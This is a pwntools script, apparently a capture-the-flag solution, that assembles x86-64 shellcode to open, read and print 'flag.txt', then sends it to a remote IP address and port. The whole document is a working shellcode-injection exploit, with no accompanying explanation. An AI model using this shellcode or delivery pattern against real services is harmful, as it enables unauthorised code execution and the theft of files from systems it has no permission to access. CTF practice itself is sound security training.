from pwn import *

shellcode = asm('''
    /* open("flag.txt", O_RDONLY) */
    xor rax, rax
    push rax
    mov rsi, 0x7478742e67616c66  /* "flag.txt" in reverse */
    push rsi
    mov rdi, rsp
    xor rsi, rsi
    mov al, 2
    syscall
    
    /* read(fd, rsp, 100) */
    mov rdi, rax
    mov rsi, rsp
    mov rdx, 100
    xor rax, rax
    syscall
    
    /* write(1, rsp, rax) */
    mov rdx, rax
    mov rdi, 1
    mov rsi, rsp
    mov al, 1
    syscall
''', arch='amd64')

io = remote("34.170.146.252", 29682)
io.sendline(shellcode)

log.info(f"{io.recvall().decode()}")
